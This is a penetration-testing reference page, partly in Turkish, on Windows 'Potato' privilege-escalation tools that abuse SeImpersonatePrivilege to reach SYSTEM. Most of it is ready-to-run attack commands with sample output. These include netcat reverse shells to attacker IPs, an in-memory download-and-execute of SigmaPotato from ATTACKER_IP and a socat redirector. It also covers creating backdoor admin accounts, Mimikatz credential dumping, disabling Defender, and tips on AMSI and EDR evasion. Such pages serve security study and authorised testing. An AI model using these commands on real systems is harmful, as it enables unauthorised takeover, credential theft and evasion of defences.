# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!UYARI]
> **JuicyPotato, Windows Server 2019 ve Windows 10 build 1809 ve sonrası sürümlerde çalışmaz.** Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** aynı ayrıcalıkları kullanarak `NT AUTHORITY\SYSTEM` seviyesinde erişim elde etmek için kullanılabilir. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` aracını derinlemesine inceler; `PrintSpoofer`, JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 host'larında impersonation ayrıcalıklarını kötüye kullanmak için kullanılabilir.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

> [!İPUCU]
> 2024–2025 döneminde sıkça güncellenen modern bir alternatif SigmaPotato'dur (GodPotato'ın bir fork'u); in-memory/.NET reflection kullanımı ve genişletilmiş işletim sistemi desteği ekler. Aşağıda hızlı kullanım ve Referanslar'daki repo'ya bakın.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Aşağıdaki tüm teknikler, şu ayrıcalıklardan birine sahip bir bağlamdan impersonation yeteneğine sahip bir ayrıcalıklı servisin kötüye kullanılmasına dayanır:

- SeImpersonatePrivilege (en yaygın) veya SeAssignPrimaryTokenPrivilege
- Eğer token zaten SeImpersonatePrivilege'e sahipse yüksek integrity gerekmez (bu, IIS AppPool, MSSQL gibi birçok servis hesabı için tipiktir)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Operasyonel notlar:

- Eğer shell'iniz bazı bağlamlarda yaygın olan SeImpersonatePrivilege eksikliği olan kısıtlı bir token altında çalışıyorsa (ör. Local Service/Network Service), hesabın varsayılan ayrıcalıklarını FullPowers kullanarak geri alın, ardından bir Potato çalıştırın. Örnek: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer'ın Print Spooler servisinin çalışıyor olmasına ve yerel RPC endpoint'i (spoolss) üzerinden erişilebilir olmasına ihtiyacı vardır. PrintNightmare sonrası Spooler'ın devre dışı bırakıldığı sertleştirilmiş ortamlarda RoguePotato/GodPotato/DCOMPotato/EfsPotato'ı tercih edin.
- RoguePotato, TCP/135 üzerinden erişilebilir bir OXID resolver gerektirir. Giden trafik engelliyse bir redirector/port-forwarder kullanın (aşağıdaki örneğe bakın). Eski sürümler -f bayrağına ihtiyaç duyuyordu.
- EfsPotato/SharpEfsPotato MS-EFSR'i kötüye kullanır; bir pipe engellendiyse alternatif pipe'ları deneyin (lsarpc, efsrpc, samr, lsass, netlogon).
- RpcBindingSetAuthInfo sırasında 0x6d3 hatası genellikle bilinmeyen/desteklenmeyen bir RPC kimlik doğrulama servisini işaret eder; farklı bir pipe/transport deneyin veya hedef servisin çalıştığından emin olun.
- DeadPotato gibi "kitchen-sink" fork'lar ekstra payload modülleri (Mimikatz/SharpHound/Defender off) paketler ve diske dokunurlar; orijinal, daha yalın versiyonlara kıyasla daha yüksek EDR tespiti bekleyin.

## Hızlı Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notlar:
- Geçerli konsolda etkileşimli bir süreç başlatmak için -i'yi, tek satırlık bir komut çalıştırmak için -c'yi kullanabilirsiniz.
- Spooler servisi gereklidir. Devre dışıysa bu başarısız olur.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Giden 135 engellendiyse, OXID resolver'ı redirector'ınızda socat ile pivot edin:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato, Spooler/BITS yerine **PrintNotify** servisini hedefleyen ve 2022 sonlarında yayınlanan daha yeni bir COM abuse primitive'tir. Binary, PrintNotify COM sunucusunu örnekler, sahte bir `IUnknown` yerleştirir ve ardından `CreatePointerMoniker` üzerinden ayrıcalıklı bir callback tetikler. PrintNotify servisi (çalışırken **SYSTEM**) geri bağlandığında, süreç döndürülen token'ı çoğaltır ve sağlanan payload'u tam ayrıcalıklarla çalıştırır.

Temel çalışma notları:

* Print Workflow/PrintNotify servisi yüklü olduğu sürece Windows 10/11 ve Windows Server 2012–2022'de çalışır (legacy Spooler PrintNightmare sonrası devre dışı bırakıldığında bile mevcuttur).
* Çağıran bağlamın **SeImpersonatePrivilege**'e sahip olmasını gerektirir (IIS APPPOOL, MSSQL ve zamanlanmış görev servis hesapları için tipiktir).
* Doğrudan bir komut veya etkileşimli mod kabul eder, böylece orijinal konsolda kalabilirsiniz. Örnek:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Saf COM tabanlı olduğu için named-pipe listeners veya external redirectors gerekmez; bu da Defender'ın RoguePotato’ın RPC binding'ini engellediği hostlarda drop-in bir replacement sağlar.

Ink Dragon gibi operatörler, SharePoint'te ViewState RCE elde eder elde etmez PrintNotifyPotato çalıştırarak `w3wp.exe` worker'dan SYSTEM'a pivot yapar ve ShadowPad'i kurmadan önce ayrıcalıkları yükseltir.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
İpucu: Bir pipe başarısız olursa veya EDR bunu engellerse, diğer desteklenen pipe'leri deneyin:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notlar:
- SeImpersonatePrivilege mevcut olduğunda Windows 8/8.1–11 ve Server 2012–2022 genelinde çalışır.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE olan service DCOM objects'ı hedefleyen iki varyant sağlar. Sağlanan binaries'i derleyin veya kullanın ve komutunuzu çalıştırın:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (güncellenmiş GodPotato fork)

SigmaPotato, .NET reflection aracılığıyla bellek içi yürütme ve bir PowerShell reverse shell helper gibi modern kolaylıklar ekler.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
2024–2025 sürümlerinde ek avantajlar (v1.2.x):
- Yerleşik reverse shell flag `--revshell` ve 1024 karakterlik PowerShell sınırının kaldırılması sayesinde uzun AMSI-bypassing payloads'ı tek seferde çalıştırabilirsiniz.
- Reflection-friendly sözdizimi (`[SigmaPotato]::Main()`), ayrıca basit heuristikleri yanıltmak için `VirtualAllocExNuma()` ile temel bir AV evasion hilesi.
- PowerShell Core ortamları için .NET 2.0'a karşı derlenmiş ayrı `SigmaPotatoCore.exe`.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato, GodPotato'un OXID/DCOM impersonation zincirini korur ama post-exploitation yardımcılarını dahili hale getirerek operatörlerin ek araçlara ihtiyaç duymadan hemen SYSTEM almasını ve persistence/collection gerçekleştirmesini sağlar.

Yaygın modüller (tümü SeImpersonatePrivilege gerektirir):

- `-cmd "<cmd>"` — SYSTEM olarak rastgele bir komut çalıştırır.
- `-rev <ip:port>` — hızlı reverse shell.
- `-newadmin user:pass` — persistence için yerel bir admin oluşturur.
- `-mimi sam|lsa|all` — Mimikatz'ı bırakıp çalıştırarak credentials'ı dump eder (diske dokunur, gürültülü).
- `-sharphound` — SharpHound collection'ı SYSTEM olarak çalıştırır.
- `-defender off` — Defender'ın gerçek zamanlı korumasını kapatır (çok gürültülü).

Örnek tek satırlık komutlar:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ek ikili dosyalar içerdiği için, daha yüksek AV/EDR flags bekleyin; stealth önemliyse daha hafif GodPotato/SigmaPotato kullanın.

## Referanslar

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
